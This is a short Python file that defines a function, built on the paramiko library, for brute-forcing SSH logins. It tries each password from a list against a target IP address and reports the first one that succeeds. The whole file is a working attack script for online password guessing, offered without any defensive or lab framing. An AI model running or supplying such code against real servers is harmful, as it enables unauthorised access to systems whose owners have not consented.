import paramiko


def brute_force_ssh(target_ip, username, password_list):
    for password in password_list:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh.connect(target_ip, username=username, password=password)
            print(f"Password found: {password}")
            ssh.close()
            return password
        except paramiko.AuthenticationException:
            continue
    print("Password not found")
